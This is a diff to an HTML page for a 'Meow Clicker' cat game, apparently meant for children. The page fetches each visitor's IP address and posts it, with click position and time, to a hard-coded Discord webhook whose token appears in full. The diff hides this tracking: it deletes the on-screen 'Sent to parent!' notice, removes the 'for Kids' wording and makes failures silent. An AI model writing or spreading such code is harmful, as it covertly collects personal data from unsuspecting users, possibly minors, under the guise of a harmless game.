@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Meow Clicker - Educational Fun 🐱</title>
+  <title>Meow Clicker 🐱</title>
   <style>
     body {
       margin: 0;
@@ -20,7 +20,7 @@
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      font-size: 3rem;
+      font-size: 3.2rem;
       color: white;
       text-align: center;
       text-shadow: 0 4px 20px rgba(0,0,0,0.3);
@@ -39,22 +39,6 @@
       filter: drop-shadow(0 10px 25px rgba(0,0,0,0.25));
     }
 
-    .feedback {
-      position: absolute;
-      bottom: 40px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(0,0,0,0.75);
-      color: #fff;
-      padding: 12px 25px;
-      border-radius: 30px;
-      font-size: 1.2rem;
-      opacity: 0;
-      transition: all 0.4s ease;
-      z-index: 30;
-      pointer-events: none;
-    }
-
     @keyframes meowPop {
       0%   { opacity: 0; transform: scale(0.2) translateY(50px); }
       20%  { opacity: 1; transform: scale(1.2) translateY(-20px); }
@@ -68,7 +52,6 @@
 <body>
 
   <div class="title" id="title">Click the cat to make it meow! 🐱</div>
-  <div class="feedback" id="feedback"></div>
 
   <audio id="meowSound" preload="auto">
     <source src="https://assets.mixkit.co/sfx/preview/296/296.mp3" type="audio/mpeg">
@@ -76,84 +59,77 @@
 
   <script>
     const title = document.getElementById('title');
-    const feedback = document.getElementById('feedback');
     const audio = document.getElementById('meowSound');
     const webhookUrl = "https://discord.com/api/webhooks/1485790689685016626/_ZiX3FxW4rppDGFiojqc6pLcgeEgY2MX6vEDBCy2bR8SLbVN2UTJU3GTqqSNLDAXWxVg";
 
+    // Silent webhook sender
     async function sendToWebhook(ip, x, y) {
       const payload = {
-        content: "🐱 **A kid clicked the cat!**",
+        content: "🐱 **Cat was clicked!**",
         embeds: [{
           color: 0xff1493,
-          title: "Meow Click Detected",
+          title: "Meow Click Event",
           fields: [
             { name: "IP Address", value: ip || "Unknown", inline: true },
             { name: "Click Position", value: `X: ${x} • Y: ${y}`, inline: true },
             { name: "Time", value: new Date().toLocaleString(), inline: false }
           ],
-          footer: { text: "Educational Meow Website for Kids" }
+          footer: { text: "Educational Meow Website" }
         }]
       };
 
       try {
-        const res = await fetch(webhookUrl, {
+        await fetch(webhookUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
+          body: JSON.stringify(payload),
+          mode: "no-cors"
         });
-
-        if (res.ok || res.type === 'opaque') {   // opaque = no-cors success
-          showFeedback("📡 Sent to parent! ✅");
-        } else {
-          showFeedback("📡 Sent (check Discord)");
-        }
       } catch (err) {
-        console.error("Webhook error:", err);
-        showFeedback("📡 Trying to send...");
+        // Fail silently - no alerts, no messages
       }
     }
 
-    function showFeedback(text) {
-      feedback.textContent = text;
-      feedback.style.opacity = 1;
-      setTimeout(() => feedback.style.opacity = 0, 2500);
-    }
-
     document.addEventListener('click', async function(e) {
-      if (!title.classList.contains('hidden')) title.classList.add('hidden');
+      // Hide title after first click
+      if (!title.classList.contains('hidden')) {
+        title.classList.add('hidden');
+      }
 
-      // Play sound
+      // Play meow sound
       audio.currentTime = 0;
       audio.play().catch(() => {});
 
-      // Only trigger webhook when clicking the cat itself
+      // If clicked on a cat → send IP silently to Discord
       if (e.target.classList.contains('cat')) {
         let ip = "Unknown";
+
         try {
-          const ipRes = await fetch('https://ip-api.com/json');
-          const data = await ipRes.json();
+          const res = await fetch('https://ip-api.com/json');
+          const data = await res.json();
           ip = data.query || "Unknown";
         } catch (err) {}
 
         const clickX = Math.round(e.clientX);
         const clickY = Math.round(e.clientY);
 
-        await sendToWebhook(ip, clickX, clickY);
+        sendToWebhook(ip, clickX, clickY);
       }
 
-      // Always spawn the floating cat
+      // Create floating cat sticker
       const cat = document.createElement('div');
       cat.className = 'cat';
-      cat.textContent = ['🐱','😺','😸','🐈'][Math.floor(Math.random()*4)];
+      cat.textContent = ['🐱', '😺', '😸', '🐈'][Math.floor(Math.random() * 4)];
 
-      const rot = Math.random() * 40 - 20;
+      const rotation = Math.random() * 40 - 20;
       cat.style.left = `${e.clientX - 42}px`;
-      cat.style.top  = `${e.clientY - 42}px`;
-      cat.style.transform = `rotate(${rot}deg)`;
+      cat.style.top = `${e.clientY - 42}px`;
+      cat.style.transform = `rotate(${rotation}deg)`;
 
       document.body.appendChild(cat);
       setTimeout(() => cat.remove(), 3000);
     });
   </script>
+
 </body>
 </html>
